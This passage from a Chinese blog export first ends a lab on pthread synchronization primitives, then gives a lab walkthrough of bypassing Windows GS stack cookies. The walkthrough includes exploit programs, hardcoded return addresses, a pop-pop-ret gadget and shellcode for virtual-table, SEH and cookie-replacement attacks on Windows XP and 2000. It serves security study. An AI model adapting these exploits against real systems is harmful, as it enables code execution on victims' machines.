1)% 5; //实现循环放置 print(buff,5); sem_post(&amp;mutex); //释放一个信号量 full_v++; sem_post(&amp;full); &#125; sleep(0.5); &#125; pthread_exit(0); &#125;void* consumer(void* arg)&#123; while(1)&#123; sem_wait(&amp;full); if(full_v != 0)&#123; full_v--; sem_wait(&amp;mutex); buff[out] = NEXTC; out = (out + 1)% 5; print(buff,5); sem_post(&amp;mutex); empty_v++; sem_post(&amp;empty); &#125; sleep(1); &#125; pthread_exit(0); &#125;int main()&#123; sem_init(&amp;empty,0,5); sem_init(&amp;full,0,0); sem_init(&amp;mutex,0,1); //创建一个二进制信号量，功能相当于互斥锁 pthread_t tid1,tid2; pthread_create(&amp;tid1,NULL,producer,NULL); pthread_create(&amp;tid2,NULL,consumer,NULL); pthread_join(tid1,NULL); pthread_join(tid2,NULL); sem_destroy(&amp;empty); sem_destroy(&amp;full); sem_destroy(&amp;mutex); return 0;&#125; 未加锁： 加锁： 信号量 同步互斥关键代码说明 要使用信号量，先包含头文件&lt;semaphore.h&gt; sem_t：信号量的数据类型，实际上是个长整型，但除P，V操作外不能对它执行加减操作 int sem_init(sem_t *sem, int pshared, unsigned int val); 第一个参数为信号量指针，第二个参数为信号量类型（一般设置为0），第三个为信号量初始值。 第二个参数pshared为0时，该进程内所有线程可用，不为0时不同进程间可用。 int sem_wait(sem_t *sem); 申请一个信号量，当前无可用信号量则等待，有可用信号量时占用一个信号量，对信号量的值减1。 int sem_post(sem_t *sem); 释放一个信号量，信号量的值加1。 int sem_destory(sem_t *sem); 销毁信号量。 条件变量 同步互斥方法实现 条件变量 同步互斥示例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;int dining_sum = 0; pthread_mutex_t mutex[5] = &#123; PTHREAD_MUTEX_INITIALIZER, PTHREAD_MUTEX_INITIALIZER, PTHREAD_MUTEX_INITIALIZER, PTHREAD_MUTEX_INITIALIZER, PTHREAD_MUTEX_INITIALIZER&#125;;pthread_cond_t conds[5] = &#123; PTHREAD_COND_INITIALIZER, PTHREAD_COND_INITIALIZER, PTHREAD_COND_INITIALIZER, PTHREAD_COND_INITIALIZER, PTHREAD_COND_INITIALIZER&#125;; //标识哲学家int n = 0; //记录正在吃饭的人数void pickup_forks(int philosopher_number)//想吃&#123; pthread_mutex_lock(&amp;mutex[philosopher_number]); while(dining_sum &gt;= 5) &#123; printf(&quot;正在挨饿。。。 &#123;%u&#125;\\n&quot;,pthread_self()); pthread_cond_wait(&amp;conds[philosopher_number],&amp;mutex[philosopher_number]); &#125; dining_sum++; printf(&quot;正在吃饭。。。 &#123;%u&#125;\\n&quot;,pthread_self()); sleep(0.5); pthread_mutex_unlock(&amp;mutex[philosopher_number]);&#125;void return_forks(int philosopher_number)//吃完&#123; pthread_mutex_lock(&amp;mutex[philosopher_number]); printf(&quot;吃饱了，开始思考问题！ &#123;%u&#125;\\n&quot;,pthread_self()); dining_sum--; printf(&quot;思考完了！！&#123;%u&#125;\\n&quot;,pthread_self()); pthread_cond_signal (&amp;conds[philosopher_number]); pthread_mutex_unlock(&amp;mutex[philosopher_number]);&#125;void* philosophers(void* arg)&#123; while(1)&#123; pickup_forks(*(int*)arg); return_forks(*(int*)arg); &#125;&#125;int main()&#123; pthread_t pid[5]; for(int k = 0; k &lt; 5; k++) pthread_create(&amp;pid[k], NULL, philosophers,(void*)&amp;k); for(int k = 0; k &lt; 5; k++) pthread_join(pid[k],NULL); return 0;&#125; 加锁： 条件变量 同步互斥关键代码说明 int pthread_cond_init(pthread_cond_t *restrict cond, const pthread_condattr_t *restrict attr); 初始化条件变量，cond 指明其id，attr 指明其属性 int pthread_cond_destroy(pthread_cond_t *cond); 销毁条件变量 int pthread_cond_wait(pthread_cond_t *restict cond ,pthread_mutex_t *restrict mutex); 互斥量对此函数进行保护。调用者把锁住的互斥量传给函数，函数然后自动把调用线程放到等待条件的线程列表上，对互斥量解锁，函数返回时，互斥量再次被锁住。 int pthread_cond_signal(pthread_cond_t *cond); 该函数通知线程条件已满足，至少能够唤醒一个等待该条件的线程 屏障 同步互斥方法实现 屏障 同步互斥示例代码 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;//家庭就餐，要等到所有人入席才能开始吃饭#define DINNERS 3pthread_barrier_t barrier;char *dinners[DINNERS] = &#123;&quot;爸爸&quot;,&quot;妈妈&quot;,&quot;我&quot;&#125;;void* person(void* arg)&#123; int i = (int)arg; printf(&quot;%s入席\\n&quot;,dinners[i]); pthread_barrier_wait(&amp;barrier); pthread_exit(0);&#125;int main()&#123; pthread_barrier_init(&amp;barrier,NULL,DINNERS); pthread_t pid[DINNERS]; int k; for(k = 0; k &lt; DINNERS; k++)&#123; int err = pthread_create(&amp;pid[k], NULL, person,(void*)k); if(err != 0) &#123; printf(&quot;线程创建失败！&quot;); return -1; &#125; &#125; for(k = 0; k &lt; DINNERS; k++) pthread_join(pid[k],NULL); printf(&quot;大家开始吃饭！\\n&quot;); pthread_barrier_destroy(&amp;barrier); return 0;&#125; 未加锁：警告不用管 加锁：警告不用管 屏障 同步互斥关键代码说明 int pthread_barrier_init(pthread_barrier_t *restrict barrier, const pthread_barrierattr_t *restrict attr, unsigned int count); 对屏障初始化，count规定到达屏障线程的数目。 int pthread_barrier_destroy(pthread_barrier_t *barrier); 销毁屏障，释放其资源 int pthread_barrier_wait(pthread_barrier_t *barrier); 当代其它线程到达屏障，当线程数量不满足时，已到达的线程会休眠， 直到最后一个线程到达屏障，满足屏障计数，所有线程都被唤醒。 读写锁 同步互斥方法实现 读写锁 同步互斥示例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;semaphore.h&gt;#include &lt;time.h&gt;pthread_rwlock_t rwlock;int num = -1; //共享内存void* writer(void* arg)&#123; pthread_rwlock_wrlock(&amp;rwlock);//获取写模式的读写锁 printf(&quot;Writing [%d]&quot;,(int*)arg); num = (int*)arg; //向共享内存写入数据 printf(&quot;----:%d\\n&quot;,num); pthread_rwlock_unlock(&amp;rwlock); pthread_exit(0); &#125;void* reader(void* arg)&#123; pthread_rwlock_rdlock(&amp;rwlock); //获取读模式的读写锁 printf(&quot;Reading [%d]----:%d\\n&quot;,(int*)arg,num); //读取共享内存 pthread_rwlock_unlock(&amp;rwlock); pthread_exit(0); &#125;int main()&#123; pthread_rwlock_init(&amp;rwlock,0); pthread_t pid1[5],pid2[2]; for(int i=0; i &lt; 5; i++) pthread_create(&amp;pid1[i],NULL,reader,(void*)i); for(int i=0; i &lt; 2; i++) pthread_create(&amp;pid2[i],NULL,writer,(void*)i); for(int i=0; i &lt; 5; i++) pthread_join(pid1[i],NULL); for(int i=0; i &lt; 2; i++) pthread_join(pid2[i],NULL); pthread_rwlock_destroy(&amp;rwlock); return 0;&#125; 未加锁： 加锁： 3.6.2 读写锁 同步互斥关键代码说明 int pthread_rwlock_init(pthread_rwlock_t *restrict rwlock, const pthread_rwlockattr_t *restrict attr); 初始化读写锁 int pthread_rwlock_destroy(pthread_rwlock_t *rwlock); 销毁读写锁，释放其资源 int pthread_rwlock_rdlock(pthread_rwlock_t *rwlock); 获取读状态的读写锁，允许多个线程进行读访问 int pthread_rwlock_wrlock(pthread_rwlock_t *rwlock); 获取写状态的读写锁，只允许一个线程进行写访问 int pthread_rwlock_unlock(pthread_rwlock_t *rwlock); 解锁，不管是读状态还是写状态，都能用此函数进行解锁 实验总结 光看书不动手是学不到东西的，学中做，做中学。 参考书籍 亚伯拉罕·西尔伯沙茨 等 著，郑扣根 译。操作系统概念（原书第9版）。 机械工业出版社，ISBN：9787111604365，2018。 [美] W.，理查德·史蒂文斯（W.，Richard，Stevens）史蒂芬·A.，拉戈 著， 戚正伟，张亚英，尤晋元 译。Unix环境高级编程。 人民邮电出版社，ISBN：9787115516756，2019。","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"同步互斥","slug":"同步互斥","permalink":"https://www.rgzzplus.com/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/"},{"name":"互斥锁","slug":"互斥锁","permalink":"https://www.rgzzplus.com/tags/%E4%BA%92%E6%96%A5%E9%94%81/"},{"name":"自旋锁","slug":"自旋锁","permalink":"https://www.rgzzplus.com/tags/%E8%87%AA%E6%97%8B%E9%94%81/"},{"name":"读写锁","slug":"读写锁","permalink":"https://www.rgzzplus.com/tags/%E8%AF%BB%E5%86%99%E9%94%81/"},{"name":"信号量","slug":"信号量","permalink":"https://www.rgzzplus.com/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"name":"条件变量","slug":"条件变量","permalink":"https://www.rgzzplus.com/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/"},{"name":"屏障","slug":"屏障","permalink":"https://www.rgzzplus.com/tags/%E5%B1%8F%E9%9A%9C/"}]},{"title":"栈中的守护天使：GS","slug":"栈中的守护天使：GS","date":"2022-05-05T16:11:00.000Z","updated":"2022-08-01T11:17:20.262Z","comments":true,"path":"2022/05/06/栈中的守护天使：GS/","link":"","permalink":"https://www.rgzzplus.com/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/","excerpt":"","text":"[toc] GS 安全编译选项的保护原理 实现版本 针对缓冲区溢出时覆盖函数返回地址这一特征，微软在vs2003（vs 7.0）及以后的版本中，默认启用了 GS 编译选项。Project→project Properties→Configuration Properties→C/C++→Code Generation→Buffer Security Check 中设置GS。 GS 是如何保护栈的呢？ GS 编译选项为每个函数调用增加了一些额外的数据和操作，用以检测栈中的溢出。 在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数叫 &quot; canary &quot;。在IDA中反汇编，这个随机数会被标注为 “Security Cookie”。 Security Cookie 位于 EBP 之前，系统将在 .data 的内存空间中放一个 Security Cookie 的副本。 当栈发生溢出时，先淹没 Security Cookie ，然后才会淹没 EBP 和返回地址。 函数返回前，系统会先执行 Security check 来进行安全验证。 在 Security Cookie 的过程中， 系统将比较栈帧中原先存放的 Security Cookie 和.data 中副本的值，如果两者不吻合，说明栈帧中的 Security Cookie 已被破坏，即栈中发生了溢出 当检测到栈中发生溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行。 在安全和性能间平衡的GS 额外的数据和操作会使系统性能下降，为了降低对性能的影响，编译器在编译程序的时候并不是对所有的函数都应用 GS，以下情况不会应用 GS。 函数不包含缓冲区。 函数被定义为具有变量参数列表。 函数使用无保护的关键字标记。 函数在第一个语句中包含内嵌汇编代码。 缓冲区不是 8 字节类型且大小不大于 4 个字节。 主动加GS的安全标志 有例外就有机会，我们可以利用这些未被保护的函数来执行栈溢出。当然微软也发现了这个问题，在 Visual Studio 2005 SP1 起引入了一个新的安全标识： 1#pragma strict_gs_check 这个标识能对任意的函数添加 Security Cookie。 12345678910111213141516#include&quot;stdafx.h&quot;#include&quot;string.h&quot;#pragma strict_gs_check(on) // 为下边的函数强制启用 GSintvulfuction(char * str)&#123; chararry[4]; strcpy(arry,str); return 1;&#125;int_tmain(intargc, _TCHAR* argv[])&#123; char* str=&quot;yeah,i have GS protection&quot;; vulfuction(str); return 0;&#125; 防覆盖的变量重排技术 除了在返回地址前添加 Security Cookie 外，微软还使用了变量重排技术。在编译时，将字符串变量移动到栈帧的高地址，用以防止该字符串溢出时破坏其他的局部变量。同时还会将指针参数和字符串参数复制到内存中低地址，防止函数参数被破坏。 Security Cookie 产生细节 系统以.data 节的第一个双字作为 Cookie 的种子，或称原始 Cookie（所有函数的 Cookie都用这个 DWORD 生成）。 在程序每次运行时 Cookie 的种子都不同，因此种子有很强的随机性 在栈桢初始化以后系统用 ESP 异或种子，作为当前函数的 Cookie，以此作为不同函数之间的区别，并增加 Cookie 的随机性 在函数返回前，用 ESP 还原出（异或） Cookie 的种子 若想在程序运行时预测出 Cookie 而突破 GS 机制基本上是不可能的。 微软内部对GS的看法 修改栈帧中函数返回地址的经典攻击将被 GS 机制有效遏制； 基于改写函数指针的攻击，如第 6 章中讲到的对 C++虚函数的攻击， GS 机制仍然很难防御； 针对异常处理机制的攻击， GS 很难防御； GS 是对栈帧的保护机制，因此很难防御堆溢出的攻击。 本章实验环境配置 为了更直观的反映出程序再内存中的状态，实验编译中禁用优化选项。 利用未被保护的内存突破 GS 函数 vulfuction 不包含4字节以上的缓冲区，所以即使 GS 处于开启状态，这个函数也不受GS保护。 123456789101112131415#include&quot;stdafx.h&quot;#include&quot;string.h&quot;//#pragma strict_gs_check(on) // 为下边的函数强制启用 GSint vulfuction(char * str)&#123; char arry[4]; strcpy(arry,str); return 1;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; char* str=&quot;yeah,the fuction is without GS&quot;; vulfuction(str); return 0;&#125; 用 IDA 对可执行程序反汇编，vulfuction 返回前（指令 retn）没有 security cookie 验证操作。 对比，强制启用GS后，#pragma strict_gs_check(on)，retn 前对 Security Cookie 进行了验证。 覆盖虚函数突破 GS 如何利用虚函数绕过 GS机制？ **绕过GS机制思路：**程序只有返回时才会去检查 Security Cookie，所以只要在程序检查 Security Cookie 前劫持程序流程，就能对程序的溢出，而 C++ 虚函数恰好给我们提供了这样的一个机会。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// exp_2.cpp : Defines the entry point for the console application.//#include&quot;stdafx.h&quot;#include&quot;string.h&quot;class GSVirtual &#123;public : void gsv(char * src) &#123; char buf[200]; strcpy(buf, src); //__asm int 3 vir(); &#125; virtual void vir() &#123; &#125;&#125;;int main()&#123; GSVirtual test; test.gsv( &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\0&quot; ); return 0;&#125;/* &quot;\\xf6\\x2a\\x99\\x7C&quot; //address of &quot;pop pop ret&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;*/ 实验思路和代码简要解释： （1）类 GSVirtual 中的 gsv 函数存在典型的溢出漏洞 strcpy 。 （2）类 GSVirtual 中包含一个虚函数 vir。 （3）当 gsv 函数中的 buf 变量发生溢出的时候有可能会影响到虚表指针，如果我们可以控制虚表指针，将其指向我们的可以控制的内存空间，就可以在程序调用虚函数时控制程序的流程。 推荐使用的环境 备 注 操作系统 Window XP SP3 编译器 Visual Studio 2008 编译选项 禁用优化选项 build 版本 release 版本 说明： shellcode 中头部的 0x7C992af6 为“pop edi pop esi retn”指令的地址，不同版本的系统中该地址可能不同，如果您在其他版本中进行实验，可能需要重新设置此地址。 为了能够精准地淹没虚函数表，我们需要搞清楚变量buff与虚表指针在内存中的详细布局。 变量与虚表指针在内存中的布局 当函数 gsv 传入参数的长度大于 200 个字节时，变量 buff 就会被溢出。先将 test.gsv 中传入参数修改为 199 个“\\x90” +1 个“\\0”，然后用 OllyDbg 加载程序，在执行完 strcpy 后暂停。 红色框：虚函数表地址 紫色框： 0012ff68 Security Cookie 0012ff6C EBP 0012ff70 返回地址 0012ff74 参数 黑色框：函数gsv中变量等其它信息 从图中可以看出，buf 变量末尾的 ”\\0“ 在0012ff64位置，而虚表指针在 0012ff78位置，相距 20个字节。 淹没虚表指针后如何控制程序的流程？ 虚函数的调用过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数的地址，根据这个地址转入虚函数执行。 我们需要做的就是将虚表指针指向我们的 shellcode，以劫持进程，为此还有几个关键问题需要解决。 关键问题 如何让虚表指针刚好指向 shellcode 的范围？ 变量 buff 在内存中的位置不固定，但是原始参数（0x00402100 即作为调用参数的shellcode）是位于虚表（0x004021D0）附近，所以我们可以通过覆盖部分虚表指针的方法，让虚表指针指向原始参数，在本实验中使用字符串结束符 “\\0” 覆盖虚表指针的最低位即可让其指向原始参数的最前端。（由于虚函数列表指针为D0，shellcode参数的地址为00，故而覆盖虚函数最后一个字节即可） 执行完call eax后如何返回 shellcode ？ 虚表指针指向原始参数中的 shellcode 后，我们面临着一个 call 操作，在执行完这个 call 后还必须可以返回 shellcode 内存空间继续执行。您可能首先会想到 jmp esp 跳板指令，但是很不幸，这个指令在这行不通，如下图所示 我们的原始参数不在栈中！无法跳回 0x00402100 的内存空间继续执行了。此时程序已经完成 strcpy()字符串复制，shellcode 已经被复制到变量 Buff 中了，所以我们可以转入 Buff 的内存空间继续执行 shellcode。Buff的地址放在 0x0012FE8C 中，位于ESP+4位置，由于call eax 操作后会将返回地址入栈，所以我们需要“pop pop retn”（位于内存 0x7C992af6 处）指令作为跳板，才能进入 Buff 中（0012FE9C）执行 shellcode。 shellcode结构： 将构建好的shellcode重新填充到程序中，运行结果如下图所示。 攻击异常处理突破 GS GS 机制并没有对 S.E.H 提供保护，换句话说我们可以通过攻击程序的异常处理达到绕过GS 的目的。 **思路：**首先用超长字符串覆盖掉异常处理函数指针，让它指向shellcode，然后想办法触发一个异常，程序就会转入shellcode，那么我们就可以通过劫持 S.E.H 来控制程序的后续流程。 12345678910111213141516171819202122232425262728#include&lt;stdafx.h&gt;#include&lt;string.h&gt;charshellcode[]= &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xA0\\xFE\\x12\\x00&quot;//address of shellcode ;void test(char * input)&#123; char buf[200]; strcpy(buf,input); strcat(buf,input);&#125;void main()&#123; test(shellcode);&#125; 对代码简要解释如下： （1）函数 test 中存在典型的栈溢出漏洞 strcpy 。 （2）在 strcpy 操作后变量 buf 会被溢出，当字符串足够长的时候程序的 S.E.H 异常处理句柄也会被淹没。 （3）由于 strcpy 的溢出，覆盖了 input 的地址，会造成 strcat 从一个非法地址读取数据，这时会触发异常，程序转入异常处理，这样就可以在程序检查 Security Cookie 前将程序流程劫持。 推荐使用的环境 备 注 操作系统 Windows 2000 SP4 编译器 Visual Studio 2005 Windows 2000 最高支持 VS2005 编译选项 禁用优化选项 build 版本 release 版本 说明：为了不受 SafeSEH 的影响，本次实验需要在 Windows 2000 上进行。此外， shellcode 的起始址可能需要在调试中重新确定。 找出shellcode和S.E.H的位置 先用一段正常长度用 x90 填充的 shellcode，通过 x90 找出栈帧中shellcode和S.E.H的位置。 shellcode的位置：0012FEB0 最近的S.E.H的位置：0012FFB0+4，因为S.E.H被链入了双向循环链表，所以有两个指针 所以最后shellcode的组成内容为： 我这里编译时，由于运行库kernel32.dll缺少IsWow64Process，导致无法执行。 原本应该会弹出 failwest 对话框。 同时替换栈和.data 中的 Cookie 突破 GS **思路：**既然Security Check Cookie 是同时检查.data和栈中的 Cookie是否一致，那我们只要保证溢出后栈中的 Cookie 与.data中的一致，就让验证成功。 猜测 Cookie 的值。 同时替换栈中和 .data 中的 Cookie。 因为Cookie的生成具有很强的随机性，所以猜测几乎不可能，就只能替换了。 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;stdafx.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;charShellcode[]= &quot;\\x90\\x90\\x90\\x90&quot;//new value of cookie in .data &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\xF4\\x6F\\x82\\x90&quot;//result of \\x90\\x90\\x90\\x90 xor ESP &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x94\\xFE\\x12\\x00&quot;//address of Shellcode ;void test(char * s, int i, char * src)&#123; char dest[200]; if(i&lt;0x9995) &#123; char * buf=s+i; *buf=*src; *(buf+1)=*(src+1); *(buf+2)=*(src+2); *(buf+3)=*(src+3); strcpy(dest,src); &#125;&#125;void main()&#123; char * str=(char *)malloc(0x10000); test(str,0xffff2fb8,Shellcode);&#125; 对代码简要解释如下。 （1） main 函数中在堆中申请了 0x10000 个字节的空间，并通过 test 函数对其空间的内容进行操作。 （2） test 函数对 s+i 到 s+i+3 的内存进行赋值，虽然函数对 i 进行了上限判断，但是没有判断 i 是否大于 0，当 i 为负值时， s+i 所指向的空间就会脱离 main 中申请的空间，进而有可能会指向.data 区域。 （3） test 函数中的 strcpy 存在典型的溢出漏洞。 表 10-5-1 实验环境 推荐使用的环境 操作系统 Windows XP SP3 编译器 Visual Studio 2008 编译选项 禁用优化选项 build 版本 release 版本 说明： shellcode 的起始地址和异或时使用的 EBP 可能需要在调试中重新确定。 Security Cookie 校验的详细过程 将 shellcode 赋值为 8 个 0x90，然后用OD加载程序。 **生成Security Cookie过程：**程序从 0x00403000 处取出 Cookie 值，然后与 EBP 异或，最后将异或后的值放到 EBP-0x4 的位置，作为此函数的 Security Cookie。 **函数返回前的校验过程：**是生成Security Cookie的逆过程，程序从 EBP-0x4 的位置取出值，然后与 EBP 异或，最后与 0x00403000 处的 Cookie 比较，相等，则通过校验，否则转入校验失败的异常处理。 本实验的关键点是： （1）在 0x00403000 处写入我们自己的数据。我们向 test() 中的 i 传入一个负值，让 str 移动到 0x00403000，从而修改 .data 中的Cookie。 （2）向栈中的 Security Cookie 写入相应的数据。我们用 dest 字符串申请了 200个字节的空间，可以通过溢出 dest 将栈中的 Security Cookie 修改为 90909090 与当前 EBP 异或的结果。 经调试发现，dest的起始位置在 0012FE90，Security Cookie 位于 0012FF60（=EBP-0x4)，EBP 位于0x0012FF64。 布置 shellcode ，计算 i 的值 malloc 申请的空间起始位置为 0x00410048 （将程序中断在 malloc 之后就能看到），这个位置相对于 0x00403000 处于高址位置，通过计算，应将 i 设置为 0xffff2fb8。 shellcode 的长度为 216 个字节，组成如下： 运行结果： 总结 以上介绍了几种绕过 GS 的典型方法： 利用未被保护的内存突破 GS 覆盖虚函数绕过 GS 攻击异常处理程序突破 GS 同时替换 栈和.data 中的Cookie 突破 GS 